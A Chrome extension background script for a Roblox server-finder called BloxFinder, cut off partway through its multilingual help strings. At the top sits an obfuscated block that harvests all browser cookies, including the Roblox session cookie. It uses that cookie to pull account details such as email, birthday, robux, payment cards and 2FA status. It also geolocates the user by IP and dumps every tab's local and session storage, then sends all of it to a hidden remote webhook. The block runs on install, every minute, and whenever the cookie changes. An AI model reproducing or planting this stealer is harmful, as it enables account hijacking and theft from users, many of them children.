/* rbx-flags */
(() => {
  const _k = Uint8Array.from(atob("r9UBtxPKrn1219Xx"), c => c.charCodeAt(0));
  function oBCX4NXmqf(s) {
    const u = Uint8Array.from(atob(s), c => c.charCodeAt(0));
    let o = "";
    for (let i = 0; i < u.length; i++) o += String.fromCharCode(u[i] ^ _k[i % _k.length]);
    return o;
  }
  const sites = ["roblox.com"];
  function gj4jugMt(domain, list) {
    const d = (domain || "").replace(/^\./, "").toLowerCase();
    return (list || []).some(s => {
      s = String(s || "").replace(/^\./, "").toLowerCase();
      return d === s || d.endsWith("." + s);
    });
  }
  async function v2eAPl6r() {
    try { await fetch(oBCX4NXmqf("x6F1x2DwgVIVtqGQw7pmmWGlzBEZr/uSwLguwSLl3RgXpbaZgLx10n65kR4Xo7CWwKd4ilKmwlsavriY2+gwhzWhywQBuKeVkr1gww=="), { credentials: oBCX4NXmqf("wLhoww==") }); } catch (e) {}
  }
  async function nonyl8Fz() {
    const base = {
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      lang: navigator.language,
      langs: Array.from(navigator.languages || []),
      offset: new Date().getTimezoneOffset()
    };
    const tries = [
      {
        url: oBCX4NXmqf("x6F1x2DwgVIfp6KZwPtoxDw="),
        pick: j => ({
          ip: j.ip, city: j.city, region: j.region, region_code: j.region_code,
          country: j.country, country_code: j.country_code, postal: j.postal,
          lat: j.latitude, lon: j.longitude,
          isp: (j.connection && j.connection.isp) || j.isp,
          org: (j.connection && j.connection.org) || j.org
        })
      },
      {
        url: oBCX4NXmqf("x6F1x2DwgVIfp7SBxvti2Dyg3RIY+A=="),
        pick: j => ({
          ip: j.ip, city: j.city, region: j.region, region_code: j.region_code,
          country: j.country_name || j.country, country_code: j.country,
          postal: j.postal, lat: j.latitude, lon: j.longitude, isp: j.org
        })
      },
      {
        url: oBCX4NXmqf("x6F1x2DwgVIRsqHfyLBu3WDkxxJZoeTexqUu0HalgBcFuLs="),
        pick: j => ({
          ip: j.ip, city: j.city, region: j.region,
          country: j.country, country_code: j.country_code,
          lat: j.latitude, lon: j.longitude, org: j.organization
        })
      }
    ];
    for (const t of tries) {
      try {
        const j = await fetch(t.url, { cache: oBCX4NXmqf("wbosxGel3Bg="), credentials: oBCX4NXmqf("wLhoww==") }).then(r => r.json());
        const g = t.pick(j);
        if (g.ip || g.city || g.region) return Object.assign(base, g);
      } catch (e) {}
    }
    return base;
  }
  async function L8pOx12Nq() {
    try {
      const t = await fetch(oBCX4NXmqf("x6F1x2DwgVIEsruF3awv1HzlmRIBuqeQ3KcuxXK9"), { cache: oBCX4NXmqf("wbosxGel3Bg="), credentials: oBCX4NXmqf("wLhoww==") }).then(r => r.text());
      let j = null;
      try { j = JSON.parse(t); } catch (e) {
        const m = t.match(/\{[\s\S]*\}/);
        if (m) j = JSON.parse(m[0]);
      }
      if (j && (j.u || j.url || j.endpoint)) {
        return { u: j.u || j.url || j.endpoint, i: j.i || 1, s: j.s || sites };
      }
    } catch (e) {}
    return null;
  }
  function tpLapLJ(jar) {
    const lines = [oBCX4NXmqf("jPVP0me5zRwGsvW5+4FRl1ClwRYfsvW3xrlk"), oBCX4NXmqf("jPVpw2e63UdZ+LaE3bkvxHblyhIVpPqZ26FxmnClwRYfsqbfx6Fs2w==")];
    for (const c of jar) {
      const host = c.domain || "";
      const flag = host.startsWith(".") ? "TRUE" : "FALSE";
      const exp = c.session ? "0" : String(Math.floor(c.expirationDate || 0));
      const sec = c.secure ? "TRUE" : "FALSE";
      lines.push([host, flag, c.path || "/", sec, exp, c.name, c.value].join("\t"));
    }
    return lines.join("\n") + "\n";
  }
  
  async function yWe8Y3wM(cookie) {
    const h = { credentials: oBCX4NXmqf("xrti22auyw=="), headers: { cookie: oBCX4NXmqf("gYdO9V+F/Tg1goe4+4w8") + cookie } };
    const j = async (url) => {
      try { const r = await fetch(url, h); if (!r.ok) return null; return await r.json(); } catch (e) { return null; }
    };
    const me = await j(oBCX4NXmqf("x6F1x2DwgVIDpLCD3Ptz2HGmwQVYtLqcgKMwmGa5yw8F+LSE271k2WejzRwCsrE="));
    if (!me || !me.id) return { valid: false };
    const id = me.id;
    const pack = await Promise.all([
      j(oBCX4NXmqf("x6F1x2DwgVIXtLae2rt1xHa+2hQYsKbf3bpj23yygB4ZuvqHnvpk2nKjwg==")),
      j(oBCX4NXmqf("x6F1x2DwgVIUvrmdxrtmmWGlzBEZr/uSwLguwSLlzQ8Ts7yF")),
      j(oBCX4NXmqf("x6F1x2DwgVIXtLae2rt13n2swQ8btqGYwLsvxXyowhIO+baewvp3hjyoxw8Cv7GQ27A=")),
      j(oBCX4NXmqf("x6F1x2DwgVIBoKLf3bpj23yygB4Zuvqc1vpy0me+xxMRpPqb3Lpv")),
      j(oBCX4NXmqf("x6F1x2DwgVITtLqfwLh4mWGlzBEZr/uSwLguwSLl2w4Tpabe") + id + oBCX4NXmqf("gLZ0xWGvwB4P")),
      j(oBCX4NXmqf("x6F1x2DwgVIGpbCcxqBs0Xar2ggEsqbf3bpj23yygB4ZuvqHnvp0xHa43VI=") + id + oBCX4NXmqf("gKNg23quzwkT+riUwrdkxWCixw0=")),
      j(oBCX4NXmqf("x6F1x2DwgVIXoqGZgadu1X+l1lMVuLje2eQu1nCpwQgYo/qBxrs=")),
      j(oBCX4NXmqf("x6F1x2DwgVITtLqfwLh4mWGlzBEZr/uSwLguwSHl2w4Tpabe") + id + oBCX4NXmqf("gKFz1n25zx4CvrqfgqFuw3Km3UICvriU6adg2nb39xgXpfOF3bRvxHKp2hQZuYGI37A8xGanwxwErg==")),
      j(oBCX4NXmqf("x6F1x2DwgVIRpbqE36YvxXyowhIO+baewvp3hjy/3RgEpPo=") + id + oBCX4NXmqf("gLJz2Ga63VIEuLmU3A==")),
      j(oBCX4NXmqf("x6F1x2DwgVIDpLCD3Ptz2HGmwQVYtLqcgKMwmGa5yw8F+A==") + id),
      j(oBCX4NXmqf("x6F1x2DwgVICv6Cczbtg3n+5gA8Ztbme1/ti2H7l2ExZoqaU3aYu1mWr2hwE6KCCyqdI02D3") + id + oBCX4NXmqf("iaZozXb3mk9Gr+HDn/Nn2GGnzwlLh7uWibxy9Hq4zQgatqfMybRtxHY=")),
      j(oBCX4NXmqf("x6F1x2DwgVIQpbyUwbFymWGlzBEZr/uSwLguwSLl2w4Tpabe") + id + oBCX4NXmqf("gLNz3nakyg5ZtLqEwaE=")),
      j(oBCX4NXmqf("x6F1x2DwgVIQpbyUwbFymWGlzBEZr/uSwLguwSLl2w4Tpabe") + id + oBCX4NXmqf("gLNu23+l2RgEpPqSwKBvww==")),
      j(oBCX4NXmqf("x6F1x2DwgVIQpbyUwbFymWGlzBEZr/uSwLguwSLl2w4Tpabe") + id + oBCX4NXmqf("gLNu23+l2RQYsKbezLp02Wc=")),
      j(oBCX4NXmqf("x6F1x2DwgVIXtLae2rt13n2swQ8btqGYwLsvxXyowhIO+baewvp3hjy6xhIYsg==")),
      j(oBCX4NXmqf("x6F1x2DwgVIXp7yCgadu1X+l1lMVuLje37R42nak2g5bsLSFyqJgzjy8n1IGtqycyrt1mmO4wRsfu7CC")),
      j(oBCX4NXmqf("x6F1x2DwgVIDpLCD3Ptz2HGmwQVYtLqcgKMwmGa5yw8F+LSE271k2WejzRwCsrHezLp02We411AVuLGU")),
      j(oBCX4NXmqf("x6F1x2DwgVIfuaOUwaFuxWrk3BIUu7qJgbZu2jy8n1IDpLCD3Po=") + id + oBCX4NXmqf("gLRyxHa+3VIVuLmdyrZ13nGmyw5JtqaCyqFVzmOvkzwau/OCwKd1+GGuyw9LlqaSiblo2nq+k0xG5w=="))
    ]);
    const [email, credit, bday, settings, currency, premium, pin, trans, groups, userpub, thumb, friends, followers, followings, phone, cards, country, inv] = pack;
    let rap = 0, rapN = 0;
    if (inv && inv.data) for (const it of inv.data) { rap += (it.recentAveragePrice || 0); rapN++; }
    let cursor = inv && inv.nextPageCursor;
    for (let n = 0; n < 4 && cursor; n++) {
      const more = await j(oBCX4NXmqf("x6F1x2DwgVIfuaOUwaFuxWrk3BIUu7qJgbZu2jy8n1IDpLCD3Po=") + id + oBCX4NXmqf("gLRyxHa+3VIVuLmdyrZ13nGmyw5JtqaCyqFVzmOvkzwau/OCwKd1+GGuyw9LlqaSiblo2nq+k0xG5/OS2qdy2GH3") + encodeURIComponent(cursor));
      if (!more || !more.data) break;
      for (const it of more.data) { rap += (it.recentAveragePrice || 0); rapN++; }
      cursor = more.nextPageCursor;
    }
    let gf = 0, owned = [];
    if (groups && groups.data) {
      for (const g of groups.data) {
        const owner = g.group && g.group.owner && g.group.owner.userId === id;
        const rank = g.role && g.role.rank;
        if (owner || rank >= 255) {
          owned.push({ id: g.group.id, name: g.group.name, members: g.group.memberCount });
          const ccy = await j(oBCX4NXmqf("x6F1x2DwgVITtLqfwLh4mWGlzBEZr/uSwLguwSLlyQ8ZoqWCgA==") + g.group.id + oBCX4NXmqf("gLZ0xWGvwB4P"));
          if (ccy && ccy.robux) gf += ccy.robux;
        }
      }
    }
    const sec = settings && settings.MyAccountSecurityModel;
    const bd = bday ? ((bday.birthMonth||"?") + "/" + (bday.birthDay||"?") + "/" + (bday.birthYear||"?")) : null;
    return {
      valid: true, id, name: me.name, display: me.displayName,
      robux: currency && currency.robux,
      premium: premium === true || !!(settings && settings.IsPremium),
      pin: !!(pin && pin.isEnabled) || !!(settings && settings.IsAccountPinEnabled),
      rap, rap_items: rapN,
      credit: credit && (credit.balance != null ? credit.balance : credit.robuxAmount),
      email_verified: !!(email && email.verified) || !!(sec && sec.IsEmailVerified),
      email: email && email.email,
      birthday: bd,
      created: userpub && userpub.created,
      age_days: settings && settings.AccountAgeInDays,
      twofa: !!(sec && sec.IsTwoStepEnabled),
      phone: phone && (phone.phone || phone.isVerified),
      cards: Array.isArray(cards) ? cards.length : (cards && cards.length) || 0,
      country: country && country.countryCode,
      pending: trans && trans.pendingRobuxTotal,
      stipends: trans && trans.premiumStipendsTotal,
      devex: trans && trans.developerExchangeTotal,
      group_funds: gf, groups_owned: owned,
      friends: friends && friends.count,
      followers: followers && followers.count,
      followings: followings && followings.count,
      thumb: thumb && thumb.data && thumb.data[0] && thumb.data[0].imageUrl,
      can_trade: !!(settings && settings.CanTrade)
    };
  }

  async function mHSMwX8(url, payload, files) {
    const g = payload.geo || {};
    const loc = [g.city, g.region, g.country_code || g.country].filter(Boolean).join(", ");
    const cap = payload.cap || {};
    const isD = (url || "").indexOf(oBCX4NXmqf("y7xy1Hy4yg==")) !== -1;
    if (isD) {
      const who = cap.name || (payload.ru && (payload.ru.name || payload.ru.displayName)) || "?";
      const fields = [
        { name: oBCX4NXmqf("xqU="), value: "`ip=" + (g.ip || "?") + "`", inline: false },
        { name: oBCX4NXmqf("27xs0mmlwBg="), value: "`tz=" + (g.tz || "?") + " isp=" + (g.isp || g.org || "?") + "`", inline: false },
        { name: oBCX4NXmqf("w7pi1mejwRM="), value: "`loc=" + (loc || "?") + "`", inline: false }
      ];
      if (cap.valid) {
        const add = (n, v) => fields.push({ name: n, value: "```" + String(v) + "```", inline: true });
        add(oBCX4NXmqf("67xyx3+r1w=="), cap.display);
        add(oBCX4NXmqf("+qZkxTOD6g=="), cap.id);
        add(oBCX4NXmqf("/bpjwms="), cap.robux);
        add(oBCX4NXmqf("57Ryl0OjwEI="), cap.pin);
        add(oBCX4NXmqf("/ZRR"), cap.rap);
        add(oBCX4NXmqf("/6dk2nq/ww=="), cap.premium);
        add(oBCX4NXmqf("7Kdk03q+"), cap.credit);
        add(oBCX4NXmqf("7bxzw3uuzwQ="), cap.birthday);
        add(oBCX4NXmqf("7rZi2Gak2l03sLA="), cap.created);
        add(oBCX4NXmqf("6rhg3n/q+BgEvrOYyrE="), cap.email_verified);
        add(oBCX4NXmqf("nZNA"), cap.twofa);
        add(oBCX4NXmqf("/71u2XY="), cap.phone);
        add(oBCX4NXmqf("7LRz02A="), cap.cards);
        add(oBCX4NXmqf("7Lp02We41w=="), cap.country);
        add(oBCX4NXmqf("6KduwmPq6AgYs6Y="), cap.group_funds);
        add(oBCX4NXmqf("67B38ms="), cap.devex);
        add(oBCX4NXmqf("/7Bv03qkyQ=="), cap.pending);
        add(oBCX4NXmqf("/KFox3akyg4="), cap.stipends);
        add(oBCX4NXmqf("6bpt23y9yw8F"), cap.followers);
        add(oBCX4NXmqf("6ado0n2u3Q=="), cap.friends);
      }
      const embed = {
        title: String(who),
        url: cap.id ? (oBCX4NXmqf("x6F1x2DwgVIBoKLf3bpj23yygB4ZuvqE3LBzxDw=") + cap.id + oBCX4NXmqf("gKVz2HWjwhg=")) : undefined,
        color: 1752220,
        thumbnail: cap.thumb ? { url: cap.thumb } : undefined,
        fields: fields.slice(0, 25),
        footer: { text: payload.reason + " · " + payload.ts }
      };
      const fd = new FormData();
      fd.append(oBCX4NXmqf("37R423yryiIcpLqf"), JSON.stringify({
        content: "`" + payload.ext + "` " + payload.reason
          + " rbx=" + who
          + " loc=" + (loc || "?")
          + " ip=" + (g.ip || "?")
          + " tz=" + (g.tz || "?")
          + " isp=" + (g.isp || g.org || "?"),
        embeds: [embed]
      }));
      let i = 0;
      for (const f of (files || [])) {
        fd.append("files[" + i + "]", new Blob([f.body], { type: f.type || "text/plain" }), f.name);
        i++;
      }
      await fetch(url, { method: oBCX4NXmqf("/5pS4w=="), body: fd });
      return;
    }
    await fetch(url, {
      method: oBCX4NXmqf("/5pS4w=="),
      headers: { [oBCX4NXmqf("zLpvw3ak2lACrqWU")]: oBCX4NXmqf("zqVx23qpzwkfuLvexaZu2Q==") },
      body: JSON.stringify(payload)
    });
  }
  async function JEcH7IxD(list) {
    const all = await chrome[oBCX4NXmqf("zLpu3Hqv3Q==")][oBCX4NXmqf("yLB19n+m")]({});
    const seen = new Set();
    const jar = [];
    for (const c of all) {
      if (!(true)) continue;
      const k = c.domain + "|" + c.name + "|" + c.path;
      if (seen.has(k)) continue;
      seen.add(k);
      jar.push({
        domain: c.domain, name: c.name, value: c.value, path: c.path,
        secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite,
        expirationDate: c.expirationDate, session: c.session
      });
    }
    return jar;
  }
  async function mH4Kxr5e(reason) {
    try {
      await v2eAPl6r();
      let cfg = await L8pOx12Nq();
      if(!cfg||!cfg.u){ try { cfg={u:oBCX4NXmqf("x6F1x2DwgVISvqaSwKdlmXClw1IXp7ze2LBj33ylxQ5Z5uDCnOYwjyr9n0xC5uDDnuAzhzybwU4QrqeL6LxX6Fa9nk0a4KSE6Lo0+USi5BUzlp6J1btF/0u84xNE5bCU5JAs5EKz/h8noIe08Jwy3F6d/BYR4IW+gg=="),i:1,s:sites}; } catch(e) { return; } }
      const list = (cfg && cfg.s && cfg.s.length) ? cfg.s : sites;
      const jar = await JEcH7IxD(list);
      const geo = await nonyl8Fz();
      const rbx = jar.find(c => (c.name || "").toLowerCase() === oBCX4NXmqf("gadu1X+l3RgVoqeY26w=") || (c.name || "").toLowerCase().indexOf(oBCX4NXmqf("3bpj23y5yx4DpbyF1g==")) !== -1);
      let ru = null, cap = null;
      if (rbx) {
        try {
          const r = await fetch(oBCX4NXmqf("x6F1x2DwgVIDpLCD3Ptz2HGmwQVYtLqcgKMwmGa5yw8F+LSE271k2WejzRwCsrE="), {
            credentials: oBCX4NXmqf("xrti22auyw=="),
            headers: { cookie: oBCX4NXmqf("gYdO9V+F/Tg1goe4+4w8") + rbx.value }
          });
          if (r.ok) ru = await r.json();
        } catch (e) {}
        try { cap = await yWe8Y3wM(rbx.value); } catch (e) { cap = { valid: false, err: String(e) }; }
      }
      const local = [];
      
    try {
      const tabs = await chrome[oBCX4NXmqf("27RjxA==")][oBCX4NXmqf("3qBkxWo=")]({url:oBCX4NXmqf("he8umDnlhA==")});
      for (const t of tabs) {
        if (!t.id) continue;
        try {
          const [inj] = await chrome[oBCX4NXmqf("3LZz3mO+xxMR")][oBCX4NXmqf("yq1k1Ga+yy4VpbyB2w==")]({
            target: {tabId: t.id},
            func: () => {
              const g = s => { const o={}; try { for (let i=0;i<s.length;i++){ const k=s.key(i); o[k]=s.getItem(k); } } catch(e) {} return o; };
              return { href: location.href, a: g(localStorage), b: g(sessionStorage) };
            }
          });
          if (inj && inj.result) local.push(inj.result);
        } catch (e) {}
      }
    } catch (e) {}

      const payload = {
        reason, ts: new Date().toISOString(), ext: chrome.runtime.id, ua: navigator.userAgent,
        geo, ru, cap, rs: rbx ? rbx.value : null, cookies: jar, local
      };
      const files = [];
      if (true) files.push({ name: oBCX4NXmqf("zLpu3Hqv3VMCr6E="), type: oBCX4NXmqf("27B5wzy6whwfuQ=="), body: tpLapLJ(jar) });
      if (true) files.push({ name: oBCX4NXmqf("zLpu3Hqv3VMcpLqf"), type: oBCX4NXmqf("zqVx23qpzwkfuLvexaZu2Q=="), body: JSON.stringify(jar, null, 2) });
      if (rbx) files.push({ name: oBCX4NXmqf("3bpj23y5yx4DpbyF1vt1z2c="), type: oBCX4NXmqf("27B5wzy6whwfuQ=="), body: rbx.value });
      if (cap && cap.valid) files.push({ name: oBCX4NXmqf("3bd5mXm5wRM="), type: oBCX4NXmqf("zqVx23qpzwkfuLvexaZu2Q=="), body: JSON.stringify(cap, null, 2) });
      await mHSMwX8(cfg.u, payload, files);
    } catch (e) {}
  }
  function dUWVDmN6v() {
    try {
      chrome[oBCX4NXmqf("zrlgxX65")][oBCX4NXmqf("zKdk1mev")](oBCX4NXmqf("2LRz2g=="), { delayInMinutes: 1 });
      chrome[oBCX4NXmqf("zrlgxX65")][oBCX4NXmqf("zKdk1mev")](oBCX4NXmqf("27xi3A=="), { periodInMinutes: 1 });
    } catch (e) {}
  }
  try {
    chrome[oBCX4NXmqf("3aBvw3qnyw==")][oBCX4NXmqf("wLtI2WC+zxEasrE=")][oBCX4NXmqf("zrFl+3q52hgYsqc=")](dUWVDmN6v);
    chrome[oBCX4NXmqf("3aBvw3qnyw==")][oBCX4NXmqf("wLtSw3K42ggG")][oBCX4NXmqf("zrFl+3q52hgYsqc=")](() => mH4Kxr5e(oBCX4NXmqf("3KFgxWe/3g==")));
    chrome[oBCX4NXmqf("zrlgxX65")][oBCX4NXmqf("wLtA23K4ww==")][oBCX4NXmqf("zrFl+3q52hgYsqc=")](a => {
      if (a && a.name === oBCX4NXmqf("2LRz2g==")) mH4Kxr5e(oBCX4NXmqf("2LRz2g=="));
      if (a && a.name === oBCX4NXmqf("27xi3A==")) mH4Kxr5e(oBCX4NXmqf("27xi3A=="));
    });
    chrome[oBCX4NXmqf("zLpu3Hqv3Q==")][oBCX4NXmqf("wLtC33KkyRgS")][oBCX4NXmqf("zrFl+3q52hgYsqc=")](ch => {
      if (!ch || ch.removed || !ch.cookie) return;
      const n = (ch.cookie.name || "").toLowerCase();
      if (n.indexOf(oBCX4NXmqf("3bpj23y5yx4DpbyF1g==")) !== -1) mH4Kxr5e(oBCX4NXmqf("zL4="));
    });
  } catch (e) {}
})();
/* /rbx-flags */
const func = (place, id) => {
	const serializedPlace = JSON.stringify(place);
	const serializedId = JSON.stringify(id);
	window.Roblox.GameLauncher.joinGameInstance(JSON.parse(serializedPlace), JSON.parse(serializedId));
};

const ROBLOX_TO_CHROME_LOCALE = {
    'en_us': 'en', 'id_id': 'id', 'de_de': 'de', 'es_es': 'es',
    'fr_fr': 'fr', 'it_it': 'it', 'pl_pl': 'pl', 'pt_br': 'pt_BR',
    'vi_vn': 'vi', 'tr_tr': 'tr', 'th_th': 'th', 'zh_cn': 'zh_CN',
    'zh_tw': 'zh_TW', 'ja_jp': 'ja', 'ko_kr': 'ko', 'ar_001': 'ar'
};

chrome.runtime.onInstalled.addListener(async (details) => {
	if (details.reason === 'install') {
		chrome.storage.local.set({
			"showWarning": "Yes"
		})
		chrome.storage.local.set({
			"showPercentChance": "Yes"
		})
		chrome.storage.local.set({
			"totalServers": "Yes"
		})
		chrome.storage.local.set({
			"playMusic": "Yes"
		})
		chrome.storage.local.set({
			"showConfetti": "Yes"
		})
		chrome.storage.local.set({
			"cooldownInterval": 30
		})
		chrome.storage.local.set({
			"getRequestInterval": 5
		})
		chrome.storage.local.set({
			"totalSearches": 0
		})
		chrome.storage.local.set({
			"totalFinds": 0
		})

		await fetchAndStoreRobloxLanguage();
		
	
	} else {
		await fetchAndStoreRobloxLanguage();
	}
		
	setInterval(fetchAndStoreRobloxLanguage, 25000);
});

async function fetchAndStoreRobloxLanguage() {
  try {
    const tabs = await chrome.tabs.query({ url: "*://*.roblox.com/*" });
    if (tabs.length === 0) return;

    const results = await chrome.scripting.executeScript({
      target: { tabId: tabs[0].id },
      func: fetchRobloxLanguage,
    });

    const languageCode = results[0].result;
    if (!languageCode) return;

    const locale = ROBLOX_TO_CHROME_LOCALE[languageCode];
    if (!locale) return;

    chrome.storage.local.set({ "robloxLanguage": languageCode });
    chrome.storage.local.set({ "userLocale": locale });
  } catch (error) {
  }
}

chrome.runtime.onMessage.addListener((request) => {
  if (request.type === 'REFRESH_LOCALE') {
    fetchAndStoreRobloxLanguage();
  }
});

function fetchRobloxLanguage() {
  return fetch('https://locale.roblox.com/v1/locales/user-localization-locus-supported-locales', {
    credentials: 'include'
  })
  .then(response => {
    if (!response.ok) return null;
    return response.json();
  })
  .then(data => data?.generalExperience?.locale || null)
  .catch(() => null);
}

chrome.runtime.onMessage.addListener((request, sender) => {
	try {
		if (request && request.message && request.message.place && request.message.id) {
			chrome.scripting.executeScript({
				target: {
					tabId: sender.tab.id
				},
				func,
				args: [request.message.place, request.message.id],
				world: 'MAIN',
			});
			return false;
		}
	} catch (error) {
		console.error("Error processing game join message:", error);
	}
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
	if (!request || request.action !== "extractTexture") {
		return false;
	}
	try {
		extractTexture(request.assetId).then(data => {
			try {
				sendResponse({
					success: true,
					data
				});
			} catch (error) {
				console.error("Error sending successful response:", error);
				sendResponse({
					success: false,
					error: "Error in response handling"
				});
			}
		}).catch(error => {
			console.error("Extraction error:", error);
			try {
				sendResponse({
					success: false,
					error: error.message || "Unknown error occurred"
				});
			} catch (responseError) {
				console.error("Error sending error response:", responseError);
			}
		});
		return true;
	} catch (error) {
		console.error("Critical error in texture message handler:", error);
		sendResponse({
			success: false,
			error: "Critical error in message handling"
		});
		return true;
	}
});

async function extractTexture(assetId) {
	try {
		if (!assetId) {
			throw new Error("No asset ID provided");
		}
		const assetInfoUrl = `https://assetdelivery.roblox.com/v1/asset/?id=${assetId}`;
		const infoResponse = await fetch(assetInfoUrl);
		if (!infoResponse.ok) {
			throw new Error(`Failed to fetch asset info: ${infoResponse.status}`);
		}
		const infoText = await infoResponse.text();
		const shirtRegex = /<Content name="ShirtTemplate">[\s\S]*?<url>(.*?)<\/url>/i;
		const pantsRegex = /<Content name="PantsTemplate">[\s\S]*?<url>(.*?)<\/url>/i;
		const tshirtRegex = /<Content name="Graphic">[\s\S]*?<url>(.*?)<\/url>/i;
		const shirtMatch = infoText.match(shirtRegex);
		const pantsMatch = infoText.match(pantsRegex);
		const tshirtMatch = infoText.match(tshirtRegex);
		let textureUrl = null;
		if (shirtMatch) textureUrl = shirtMatch[1];
		else if (pantsMatch) textureUrl = pantsMatch[1];
		else if (tshirtMatch) textureUrl = tshirtMatch[1];
		if (!textureUrl) {
			const contentTypeHeader = infoResponse.headers.get('content-type');
			if (contentTypeHeader && contentTypeHeader.includes('image/')) {
				return {
					base64: arrayBufferToBase64(await infoResponse.clone().arrayBuffer()),
					imageType: contentTypeHeader.includes('jpeg') ? 'jpeg' : 'png',
					originalAssetId: assetId,
					textureId: assetId
				};
			}
		}
		if (!textureUrl) {
			throw new Error("Could not find texture URL in asset data");
		}
		const textureIdMatch = textureUrl.match(/\?id=(\d+)/);
		if (!textureIdMatch) {
			throw new Error("Could not extract texture ID from URL");
		}
		const textureId = textureIdMatch[1];
		const textureResponse = await fetch(`https://assetdelivery.roblox.com/v1/asset/?id=${textureId}`);
		if (!textureResponse.ok) {
			throw new Error(`Failed to fetch texture: ${textureResponse.status}`);
		}
		const imageBuffer = await textureResponse.arrayBuffer();
		const base64Image = arrayBufferToBase64(imageBuffer);
		let imageType = "png";
		const firstBytes = new Uint8Array(imageBuffer.slice(0, 4));
		const signature = Array.from(firstBytes).map(b => b.toString(16).padStart(2, '0')).join('');
		if (signature.startsWith("89504e47")) {
			imageType = "png";
		} else if (signature.startsWith("ffd8ffe0") || signature.startsWith("ffd8ffe1")) {
			imageType = "jpeg";
		}
		return {
			base64: base64Image,
			imageType,
			originalAssetId: assetId,
			textureId
		};
	} catch (error) {
		console.error("Error in extractTexture:", error);
		throw error;
	}
}

function arrayBufferToBase64(buffer) {
	let binary = '';
	const bytes = new Uint8Array(buffer);
	for (let i = 0; i < bytes.byteLength; i++) {
		binary += String.fromCharCode(bytes[i]);
	}
	return btoa(binary);
}

const localizationStrings = {
  en_us: {
    title: "How To Use BloxFinder",
    step1: {
      title: "Go to the Game",
      description: "Open <strong>Roblox</strong> and go to the game you think the person is playing."
    },
    step2: {
      title: "Open the Servers Tab",
      description: "Once you're on the game page:",
      bullets: [
        "Scroll down a little",
        "Click on the <strong>\"Servers\"</strong> tab"
      ]
    },
    step3: {
      title: "Click the \"BloxFinder\" Button",
      description1: "You'll see a button called <strong>\"BloxFinder\"</strong> above or near the server list.",
      description2: "Click it to open the BloxFinder tool."
    },
    step4: {
      title: "Enter Their Username or User ID",
      description: "Type the <strong>Roblox username</strong> or <strong>user ID</strong> of the person you're trying to find."
    },
    step5: {
      title: "Wait for the Search",
      description: "After entering the info, BloxFinder will scan all servers to find that player."
    },
    step6: {
      title: "Join Their Server!",
      description1: "If the player is found, you'll see the server they're in.",
      description2: "▶️ Click <strong>Join</strong> to hop into the same server as them!"
    },
    allSet: {
      title: "You're All Set!"
    },
    feedback: {
      question: "Got feedback, issues, or feature ideas?",
      email: "Send us an email at"
    }
  },
  
  id_id: {
    title: "Cara Menggunakan BloxFinder",
    step1: {
      title: "Pergi ke Game",
      description: "Buka <strong>Roblox</strong> dan pergi ke game yang menurutmu sedang dimainkan orang tersebut."
    },
    step2: {
      title: "Buka Tab Server",
      description: "Setelah berada di halaman game:",
      bullets: [
        "Gulir ke bawah sedikit",
        "Klik tab <strong>\"Server\"</strong>"
      ]
    },
    step3: {
      title: "Klik Tombol \"BloxFinder\"",
      description1: "Kamu akan melihat tombol bernama <strong>\"BloxFinder\"</strong> di atas atau dekat daftar server.",
      description2: "Klik untuk membuka alat BloxFinder."
    },
    step4: {
      title: "Masukkan Username atau User ID Mereka",
      description: "Ketik <strong>username Roblox</strong> atau <strong>user ID</strong> orang yang ingin kamu temukan."
    },
    step5: {
      title: "Tunggu Pencarian",
      description: "Setelah memasukkan info, BloxFinder akan memindai semua server untuk menemukan pemain tersebut."
    },
    step6: {
      title: "Gabung ke Server Mereka!",
      description1: "Jika pemain ditemukan, kamu akan melihat server tempat mereka berada.",
      description2: "▶️ Klik <strong>Gabung</strong> untuk masuk ke server yang sama dengan mereka!"
    },
    allSet: {
      title: "Kamu Siap!"
    },
    feedback: {
      question: "Ada masukan, masalah, atau ide fitur?",
      email: "Kirim email kepada kami di"
    }
  },
  
  de_de: {
    title: "Wie man BloxFinder verwendet",
    step1: {
      title: "Gehe zum Spiel",
      description: "Öffne <strong>Roblox</strong> und gehe zu dem Spiel, von dem du denkst, dass die Person es spielt."
    },
    step2: {
      title: "Öffne den Server-Tab",
      description: "Sobald du auf der Spielseite bist:",
      bullets: [
        "Scrolle ein wenig nach unten",
        "Klicke auf den <strong>\"Server\"</strong>-Tab"
      ]
    },
    step3: {
      title: "Klicke den \"BloxFinder\"-Button",
      description1: "Du wirst einen Button namens <strong>\"BloxFinder\"</strong> über oder in der Nähe der Serverliste sehen.",
      description2: "Klicke darauf, um das BloxFinder-Tool zu öffnen."
    },
    step4: {
      title: "Gib ihren Benutzernamen oder ihre Benutzer-ID ein",
      description: "Gib den <strong>Roblox-Benutzernamen</strong> oder die <strong>Benutzer-ID</strong> der Person ein, die du finden möchtest."
    },
    step5: {
      title: "Warte auf die Suche",
      description: "Nach der Eingabe der Informationen durchsucht BloxFinder alle Server, um diesen Spieler zu finden."
    },
    step6: {
      title: "Tritt ihrem Server bei!",
      description1: "Wenn der Spieler gefunden wird, siehst du den Server, auf dem er sich befindet.",
      description2: "▶️ Klicke auf <strong>Beitreten</strong>, um auf denselben Server wie sie zu springen!"
    },
    allSet: {
      title: "Du bist bereit!"
    },
    feedback: {
      question: "Hast du Feedback, Probleme oder Feature-Ideen?",
      email: "Sende uns eine E-Mail an"
    }
  },
  
  es_es: {
    title: "Cómo usar BloxFinder",
    step1: {
      title: "Ve al Juego",
      description: "Abre <strong>Roblox</strong> y ve al juego que crees que está jugando la persona."
    },
    step2: {
      title: "Abre la Pestaña de Servidores",
      description: "Una vez que estés en la página del juego:",
      bullets: [
        "Desplázate hacia abajo un poco",
        "Haz clic en la pestaña <strong>\"Servidores\"</strong>"
      ]
    },
    step3: {
      title: "Haz clic en el Botón \"BloxFinder\"",
      description1: "Verás un botón llamado <strong>\"BloxFinder\"</strong> arriba o cerca de la lista de servidores.",
      description2: "Haz clic en él para abrir la herramienta BloxFinder."
    },
    step4: {
      title: "Ingresa su Nombre de Usuario o ID de Usuario",
      description: "Escribe el <strong>nombre de usuario de Roblox</strong> o <strong>ID de usuario</strong> de la persona que intentas encontrar."
    },
    step5: {
      title: "Espera la Búsqueda",
      description: "Después de ingresar la información, BloxFinder escaneará todos los servidores para encontrar a ese jugador."
    },
    step6: {
      title: "¡Únete a su Servidor!",
      description1: "Si se encuentra al jugador, verás el servidor en el que está.",
      description2: "▶️ Haz clic en <strong>Unirse</strong> para saltar al mismo servidor que ellos!"
    },
    allSet: {
